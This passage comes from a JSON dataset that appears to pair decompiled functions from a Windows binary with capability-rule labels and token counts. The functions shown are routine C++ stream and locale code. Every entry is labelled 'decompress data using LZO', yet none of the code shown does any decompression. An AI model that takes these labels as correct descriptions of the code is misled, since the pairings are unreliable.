        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00483b30(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar2 = arg_8h[1];\n    *in_ECX = iVar2;\n    piVar4 = *(iVar2 + -0xc) + in_ECX;\n    *piVar4 = arg_8h[2];\n    iVar3 = *(*arg_ch + -0xc) + arg_ch;\n    fcn.0049ac60(iVar3);\n    fcn.0049c380(piVar4 + 0x1b);\n    iVar2 = *(iVar3 + 0x70);\n    *(iVar3 + 0x70) = 0;\n    piVar4[0x1c] = iVar2;\n    *(piVar4 + 0x1d) = *(iVar3 + 0x74);\n    uVar1 = *(iVar3 + 0x75);\n    piVar4[0x1e] = 0;\n    *(piVar4 + 0x75) = uVar1;\n    iVar2 = *arg_8h;\n    *in_ECX = iVar2;\n    *(in_ECX + *(iVar2 + -0xc)) = arg_8h[3];\n    fcn.00478340(arg_ch + 1);\n    *(in_ECX + *(*in_ECX + -0xc) + 0x78) = in_ECX + 1;\n    return;\n}\n",
        "token_count": 384
    },
    "00483c00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00483c00(int32_t *arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(*(iVar1 + -0xc) + in_ECX) = arg_8h[2];\n    fcn.0049c4a0(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.00478480();\n    fcn.0049c4a0(in_ECX + 1);\n    iVar1 = fcn.00476e70(arg_ch, arg_10h | 0x10);\n    if (iVar1 != 0) {\n        fcn.0049c600(0);\n        return;\n    }\n    fcn.0049c600(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 277
    },
    "00483ce0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00483ce0(int32_t *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(*(iVar1 + -0xc) + in_ECX) = arg_8h[2];\n    fcn.0049c4a0(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.00478480();\n    fcn.0049c4a0(in_ECX + 1);\n    iVar1 = fcn.00476e70(*arg_ch, arg_10h | 0x10);\n    if (iVar1 != 0) {\n        fcn.0049c600(0);\n        return;\n    }\n    fcn.0049c600(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 279
    },
    "00483dc0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00483dc0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(*(iVar1 + -0xc) + in_ECX) = arg_8h[2];\n    fcn.0049c4a0(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.00478480();\n    fcn.0049c4a0(in_ECX + 1);\n    return;\n}\n",
        "token_count": 183
    },
    "004841c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004841c0(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    int32_t iVar2;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.0049b670();\n    *in_ECX = 0x506998;\n    *(in_ECX + 0x3a) = 0;\n    iVar2 = *arg_8h;\n    in_ECX[0x39] = 0;\n    iVar2 = *(iVar2 + -0xc);\n    *(in_ECX + 0xea) = 0;\n    in_ECX[0x3b] = 0;\n    iVar2 = iVar2 + arg_8h;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    in_ECX[0x1d] = 0x5069ac;\n    fcn.0049ac60(iVar2);\n    fcn.0049cbb0(in_ECX + 0x38);\n    uVar1 = *(iVar2 + 0x70);\n    *(iVar2 + 0x70) = 0;\n    in_ECX[0x39] = uVar1;\n    *(in_ECX + 0x3a) = *(iVar2 + 0x74);\n    *(in_ECX + 0xea) = *(iVar2 + 0x76);\n    in_ECX[0x3b] = 0;\n    *in_ECX = 0x50ab9c;\n    in_ECX[0x1d] = 0x50abb0;\n    fcn.0047a310(arg_8h + 1);\n    in_ECX[0x3b] = in_ECX + 1;\n    return;\n}\n",
        "token_count": 438
    },
    "004842e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004842e0(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.0049b670();\n    *(in_ECX + 0xea) = 0;\n    in_ECX[0x39] = 0;\n    *(in_ECX + 0x3a) = 0;\n    in_ECX[0x3b] = 0;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    *in_ECX = 0x506998;\n    in_ECX[0x1d] = 0x5069ac;\n    fcn.0049cca0(0);\n    *in_ECX = 0x50ab9c;\n    in_ECX[0x1d] = 0x50abb0;\n    fcn.0047a450();\n    fcn.0049cca0(in_ECX + 1);\n    iVar1 = fcn.00478e20(arg_8h, arg_ch | 0x10);\n    if (iVar1 != 0) {\n        fcn.0049ce20(0);\n        return;\n    }\n    fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 351
    },
    "00484410": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00484410(uint *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.0049b670();\n    *(in_ECX + 0xea) = 0;\n    in_ECX[0x39] = 0;\n    *(in_ECX + 0x3a) = 0;\n    in_ECX[0x3b] = 0;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    *in_ECX = 0x506998;\n    in_ECX[0x1d] = 0x5069ac;\n    fcn.0049cca0(0);\n    *in_ECX = 0x50ab9c;\n    in_ECX[0x1d] = 0x50abb0;\n    fcn.0047a450();\n    fcn.0049cca0(in_ECX + 1);\n    iVar1 = fcn.00478e20(*arg_8h, arg_ch | 0x10);\n    if (iVar1 != 0) {\n        fcn.0049ce20(0);\n        return;\n    }\n    fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 352
    },
    "00484540": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.00484540(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.0049b670();\n    *(param_1 + 0xea) = 0;\n    param_1[0x39] = 0;\n    *(param_1 + 0x3a) = 0;\n    param_1[0x3b] = 0;\n    param_1[0x3c] = 0;\n    param_1[0x3d] = 0;\n    param_1[0x3e] = 0;\n    *param_1 = 0x506998;\n    param_1[0x1d] = 0x5069ac;\n    fcn.0049cca0(0);\n    *param_1 = 0x50ab9c;\n    param_1[0x1d] = 0x50abb0;\n    fcn.0047a450();\n    fcn.0049cca0(param_1 + 1);\n    return;\n}\n",
        "token_count": 246
    },
    "00484620": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00484620(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uchar uVar1;\n    ushort uVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = arg_8h[1];\n    *in_ECX = iVar3;\n    piVar5 = *(iVar3 + -0xc) + in_ECX;\n    *piVar5 = arg_8h[2];\n    iVar4 = *(*arg_ch + -0xc) + arg_ch;\n    fcn.0049ac60(iVar4);\n    fcn.0049cbb0(piVar5 + 0x1b);\n    iVar3 = *(iVar4 + 0x70);\n    *(iVar4 + 0x70) = 0;\n    piVar5[0x1c] = iVar3;\n    uVar2 = *(iVar4 + 0x74);\n    uVar1 = *(iVar4 + 0x76);\n    piVar5[0x1e] = 0;\n    *(piVar5 + 0x1d) = uVar2;\n    *(piVar5 + 0x76) = uVar1;\n    iVar3 = *arg_8h;\n    *in_ECX = iVar3;\n    *(in_ECX + *(iVar3 + -0xc)) = arg_8h[3];\n    fcn.0047a310(arg_ch + 1);\n    *(in_ECX + *(*in_ECX + -0xc) + 0x78) = in_ECX + 1;\n    return;\n}\n",
        "token_count": 400
    },
    "004846f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004846f0(int32_t *arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(*(iVar1 + -0xc) + in_ECX) = arg_8h[2];\n    fcn.0049cca0(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.0047a450();\n    fcn.0049cca0(in_ECX + 1);\n    iVar1 = fcn.00478e20(arg_ch, arg_10h | 0x10);\n    if (iVar1 != 0) {\n        fcn.0049ce20(0);\n        return;\n    }\n    fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 274
    },
    "004847d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004847d0(int32_t *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(*(iVar1 + -0xc) + in_ECX) = arg_8h[2];\n    fcn.0049cca0(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.0047a450();\n    fcn.0049cca0(in_ECX + 1);\n    iVar1 = fcn.00478e20(*arg_ch, arg_10h | 0x10);\n    if (iVar1 != 0) {\n        fcn.0049ce20(0);\n        return;\n    }\n    fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 276
    },
    "004848b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004848b0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(*(iVar1 + -0xc) + in_ECX) = arg_8h[2];\n    fcn.0049cca0(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.0047a450();\n    fcn.0049cca0(in_ECX + 1);\n    return;\n}\n",
        "token_count": 180
    },
    "00485a90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00485a90(uint *param_1, uint param_2)\n\n{\n    fcn.00481620(param_2);\n    *param_1 = 0x50ac50;\n    return;\n}\n",
        "token_count": 52
    },
    "00486220": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00486220(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint var_ch;\n    \n    fcn.0048f500(arg_8h + 7);\n    if (*(*arg_8h + 8) != method.c_streambufIwSt11char_traitsIwEE.virtual_8) {\n        (**(*arg_8h + 8))(arg_ch);\n    }\n    fcn.0048f670(arg_ch);\n    return;\n}\n",
        "token_count": 122
    },
    "00486bc0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00486bc0(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint var_ch;\n    \n    fcn.0048f500(arg_8h + 7);\n    if (*(*arg_8h + 8) != method.ages_bynameIcE.virtual_8) {\n        (**(*arg_8h + 8))(arg_ch);\n    }\n    fcn.0048f670(arg_ch);\n    return;\n}\n",
        "token_count": 118
    },
    "00487360": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00487360(uint8_t **arg_8h, int32_t arg_ch)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    uint8_t *puStack76;\n    uint uStack72;\n    uint8_t *var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    puVar2 = *arg_8h;\n    *in_ECX = 0x50b4dc;\n    in_ECX[2] = 0;\n    in_ECX[1] = arg_ch != 0;\n    puStack76 = NULL;\n    var_2ch = puVar2;\n    fcn.0049ba80();\n    *in_ECX = 0x50ad1c;\n    iVar1 = 2;\n    bVar4 = &puStack76 < 0x4;\n    bVar6 = *0x10 == 0x50;\n    puVar3 = 0x502c1c;\n    do {\n        if (iVar1 == 0) break;\n        iVar1 = iVar1 + -1;\n        bVar4 = *puVar2 < *puVar3;\n        bVar6 = *puVar2 == *puVar3;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    } while (bVar6);\n    bVar5 = false;\n    bVar4 = (!bVar4 && !bVar6) == bVar4;\n    if (!bVar4) {\n        iVar1 = 6;\n        puVar2 = var_2ch;\n        puVar3 = 0x502c1e;\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar5 = *puVar2 < *puVar3;\n            bVar4 = *puVar2 == *puVar3;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        } while (bVar4);\n        if ((!bVar5 && !bVar4) != bVar5) {\n            uStack72 = 0;\n            puStack76 = var_2ch;\n            fcn.0048f2e0();\n            fcn.0049ba80();\n            fcn.0048f350(&var_1ch);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 586
    },
    "00487530": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00487530(uint8_t **arg_8h, int32_t arg_ch)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    uint8_t *puStack76;\n    uint uStack72;\n    uint8_t *var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    puVar2 = *arg_8h;\n    *in_ECX = 0x50b4dc;\n    in_ECX[2] = 0;\n    in_ECX[1] = arg_ch != 0;\n    puStack76 = NULL;\n    var_2ch = puVar2;\n    fcn.0049ba80();\n    *in_ECX = 0x50ad1c;\n    iVar1 = 2;\n    bVar4 = &puStack76 < 0x4;\n    bVar6 = *0x10 == 0x50;\n    puVar3 = 0x502c1c;\n    do {\n        if (iVar1 == 0) break;\n        iVar1 = iVar1 + -1;\n        bVar4 = *puVar2 < *puVar3;\n        bVar6 = *puVar2 == *puVar3;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    } while (bVar6);\n    bVar5 = false;\n    bVar4 = (!bVar4 && !bVar6) == bVar4;\n    if (!bVar4) {\n        iVar1 = 6;\n        puVar2 = var_2ch;\n        puVar3 = 0x502c1e;\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar5 = *puVar2 < *puVar3;\n            bVar4 = *puVar2 == *puVar3;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        } while (bVar4);\n        if ((!bVar5 && !bVar4) != bVar5) {\n            uStack72 = 0;\n            puStack76 = var_2ch;\n            fcn.0048f2e0();\n            fcn.0049ba80();\n            fcn.0048f350(&var_1ch);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 586
    },
    "00487740": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00487740(uint8_t **arg_8h, int32_t arg_ch)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    uint8_t *puStack76;\n    uint uStack72;\n    uint8_t *var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    puVar2 = *arg_8h;\n    *in_ECX = 0x50b500;\n    in_ECX[2] = 0;\n    in_ECX[1] = arg_ch != 0;\n    puStack76 = NULL;\n    var_2ch = puVar2;\n    fcn.0049bdd0();\n    *in_ECX = 0x50ad40;\n    iVar1 = 2;\n    bVar4 = &puStack76 < 0x4;\n    bVar6 = *0x10 == 0x50;\n    puVar3 = 0x503000;\n    do {\n        if (iVar1 == 0) break;\n        iVar1 = iVar1 + -1;\n        bVar4 = *puVar2 < *puVar3;\n        bVar6 = *puVar2 == *puVar3;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    } while (bVar6);\n    bVar5 = false;\n    bVar4 = (!bVar4 && !bVar6) == bVar4;\n    if (!bVar4) {\n        iVar1 = 6;\n        puVar2 = var_2ch;\n        puVar3 = \"POSIX\";\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar5 = *puVar2 < *puVar3;\n            bVar4 = *puVar2 == *puVar3;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        } while (bVar4);\n        if ((!bVar5 && !bVar4) != bVar5) {\n            uStack72 = 0;\n            puStack76 = var_2ch;\n            fcn.0048f2e0();\n            fcn.0049bdd0();\n            fcn.0048f350(&var_1ch);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 578
    },
    "00487910": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00487910(uint8_t **arg_8h, int32_t arg_ch)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    uint8_t *puStack76;\n    uint uStack72;\n    uint8_t *var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    puVar2 = *arg_8h;\n    *in_ECX = 0x50b500;\n    in_ECX[2] = 0;\n    in_ECX[1] = arg_ch != 0;\n    puStack76 = NULL;\n    var_2ch = puVar2;\n    fcn.0049bdd0();\n    *in_ECX = 0x50ad40;\n    iVar1 = 2;\n    bVar4 = &puStack76 < 0x4;\n    bVar6 = *0x10 == 0x50;\n    puVar3 = 0x503000;\n    do {\n        if (iVar1 == 0) break;\n        iVar1 = iVar1 + -1;\n        bVar4 = *puVar2 < *puVar3;\n        bVar6 = *puVar2 == *puVar3;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    } while (bVar6);\n    bVar5 = false;\n    bVar4 = (!bVar4 && !bVar6) == bVar4;\n    if (!bVar4) {\n        iVar1 = 6;\n        puVar2 = var_2ch;\n        puVar3 = \"POSIX\";\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar5 = *puVar2 < *puVar3;\n            bVar4 = *puVar2 == *puVar3;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        } while (bVar4);\n        if ((!bVar5 && !bVar4) != bVar5) {\n            uStack72 = 0;\n            puStack76 = var_2ch;\n            fcn.0048f2e0();\n            fcn.0049bdd0();\n            fcn.0048f350(&var_1ch);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 578
    },
    "00487dc0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00487dc0(uint *param_1, uint param_2)\n\n{\n    fcn.00481620(param_2);\n    *param_1 = 0x50addc;\n    return;\n}\n",
        "token_count": 52
    },
    "00487e80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00487e80(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar uVar3;\n    int32_t *piVar4;\n    char *pcVar5;\n    uint uVar6;\n    uint uVar7;\n    code *pcVar8;\n    int32_t in_ECX;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    piVar4 = fcn.004a0f00(arg_8h);\n    if (*(*piVar4 + 0x10) == 0x4587b0) {\n        fcn.0046d600(*(piVar4[2] + 8), &var_27h);\n    }\n    else {\n        (**(*piVar4 + 0x10))(piVar4);\n    }\n    uVar6 = *(var_24h + -0xc);\n    *(in_ECX + 0xc) = uVar6;\n    pcVar5 = fcn.004a34e0(uVar6);\n    fcn.0042ca00(pcVar5, *(in_ECX + 0xc), 0);\n    if (*(in_ECX + 0xc) == 0) {\n        *(in_ECX + 0x10) = 0;\n        pcVar8 = *(*piVar4 + 0x14);\n        if (pcVar8 == 0x4587e0) goto code_r0x00487f19;\ncode_r0x00488167:\n        (*pcVar8)(piVar4);\n    }\n    else {\n        *(in_ECX + 0x10) = *pcVar5 - 1U < 0x7e;\n        pcVar8 = *(*piVar4 + 0x14);\n        if (pcVar8 != 0x4587e0) goto code_r0x00488167;\ncode_r0x00487f19:\n        fcn.0046d600(*(piVar4[2] + 0x14), &var_26h);\n    }\n    uVar6 = *(var_20h + -0xc);\n    *(in_ECX + 0x18) = uVar6;\n    uVar6 = fcn.004a34e0(uVar6);\n    fcn.0042ca00(uVar6, *(in_ECX + 0x18), 0);\n    if (*(*piVar4 + 0x18) == 0x458810) {\n        fcn.0046d600(*(piVar4[2] + 0x1c), &var_25h);\n    }\n    else {\n        (**(*piVar4 + 0x18))(piVar4);\n    }\n    uVar7 = *(var_1ch + -0xc);\n    *(in_ECX + 0x20) = uVar7;\n    uVar7 = fcn.004a34e0(uVar7);\n    fcn.0042ca00(uVar7, *(in_ECX + 0x20), 0);\n    if (*(*piVar4 + 8) == 0x458880) {\n        uVar3 = *(piVar4[2] + 0x24);\n    }\n    else {\n        uVar3 = (**(*piVar4 + 8))();\n    }\n    *(in_ECX + 0x24) = uVar3;\n    if (*(*piVar4 + 0xc) == 0x458890) {\n        uVar3 = *(piVar4[2] + 0x25);\n    }\n    else {\n        uVar3 = (**(*piVar4 + 0xc))();\n    }\n    *(in_ECX + 0x25) = uVar3;\n    piVar4 = fcn.004a0a80(arg_8h);\n    puVar2 = *0x4f6d64;\n    if (*(piVar4 + 7) == '\\x01') {\ncode_r0x00488036:\n        *(in_ECX + 0x26) = *puVar2;\n        *(in_ECX + 0x2a) = puVar2[1];\n        *(in_ECX + 0x2e) = puVar2[2];\n        *(in_ECX + 0x32) = puVar2[3];\n        *(in_ECX + 0x36) = puVar2[4];\n        *(in_ECX + 0x3a) = puVar2[5];\n        *(in_ECX + 0x3e) = puVar2[6];\n        *(in_ECX + 0x42) = puVar2[7];\n        *(in_ECX + 0x46) = puVar2[8];\n    }\n    else {\n        if (*(piVar4 + 7) == '\\0') {\n            fcn.00431cc0();\n            pcVar8 = *(*piVar4 + 0x1c);\n        }\n        else {\n            pcVar8 = *(*piVar4 + 0x1c);\n        }\n        if (pcVar8 == 0x431f40) goto code_r0x00488036;\n        (*pcVar8)(puVar2, puVar2 + 9, in_ECX + 0x26);\n    }\n    puVar2 = *0x4f6d60;\n    if (*(piVar4 + 7) != '\\x01') {\n        if (*(piVar4 + 7) == '\\0') {\n            fcn.00431cc0();\n            pcVar8 = *(*piVar4 + 0x1c);\n        }\n        else {\n            pcVar8 = *(*piVar4 + 0x1c);\n        }\n        if (pcVar8 != 0x431f40) {\n            (*pcVar8)(puVar2, puVar2 + 0x1a, in_ECX + 0x4a);\n            goto code_r0x004880c5;\n        }\n    }\n    *(in_ECX + 0x4a) = *puVar2;\n    *(in_ECX + 0x4e) = puVar2[1];\n    *(in_ECX + 0x52) = puVar2[2];\n    *(in_ECX + 0x56) = puVar2[3];\n    *(in_ECX + 0x5a) = puVar2[4];\n    *(in_ECX + 0x5e) = puVar2[5];\n    *(in_ECX + 0x62) = *(puVar2 + 6);\ncode_r0x004880c5:\n    iVar1 = *0x4f59f4;\n    *(in_ECX + 100) = 1;\n    *(in_ECX + 8) = pcVar5;\n    *(in_ECX + 0x14) = uVar6;\n    *(in_ECX + 0x1c) = uVar7;\n    if (iVar1 == 0) {\n        iVar1 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = var_1ch + -4;\n        iVar1 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (iVar1 < 1) {\n        fcn.0046bf60(&var_25h);\n    }\n    if (*0x4f59f4 == 0) {\n        iVar1 = *(var_20h + -4);\n        *(var_20h + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = var_20h + -4;\n        iVar1 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (iVar1 < 1) {\n        fcn.0046bf60(&var_25h);\n    }\n    if (*0x4f59f4 == 0) {\n        iVar1 = *(var_24h + -4);\n        *(var_24h + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar4 = var_24h + -4;\n        iVar1 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n    }\n    if (iVar1 < 1) {\n        fcn.0046bf60(&var_25h);\n        return;\n    }\n    return;\n}\n",
        "token_count": 1964
    },
    "00488550": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00488550(uint arg_8h)\n\n{\n    ushort uVar1;\n    int32_t *piVar2;\n    char *pcVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    code *pcVar6;\n    int32_t in_ECX;\n    int32_t extraout_ECX;\n    int32_t iVar7;\n    uint var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    piVar2 = fcn.004a0f60(arg_8h);\n    if (*(*piVar2 + 0x10) == 0x4589c0) {\n        fcn.0046d600(*(piVar2[2] + 8), &var_27h);\n    }\n    else {\n        (**(*piVar2 + 0x10))(piVar2);\n    }\n    uVar4 = *(var_24h + -0xc);\n    *(in_ECX + 0xc) = uVar4;\n    pcVar3 = fcn.004a34e0(uVar4);\n    fcn.0042ca00(pcVar3, *(in_ECX + 0xc), 0);\n    if (*(in_ECX + 0xc) == 0) {\n        *(in_ECX + 0x10) = 0;\n        pcVar6 = *(*piVar2 + 0x14);\n        if (pcVar6 != 0x4589f0) goto code_r0x004887cf;\ncode_r0x004885e6:\n        fcn.00465870(*(piVar2[2] + 0x14), &var_26h);\n        uVar5 = *(var_20h + -0xc);\n        *(in_ECX + 0x18) = uVar5;\n        if (0x3ffffffe < uVar5) goto code_r0x004887f3;\ncode_r0x00488618:\n        var_2ch = &var_20h;\n        uVar4 = fcn.004a34e0(uVar5 * 2);\n        fcn.0042bb20(uVar4, *(in_ECX + 0x18), 0);\n        if (*(*piVar2 + 0x18) == 0x458a20) {\n            fcn.00465870(*(piVar2[2] + 0x1c), &var_25h);\n            uVar5 = *(var_1ch + -0xc);\n            *(in_ECX + 0x20) 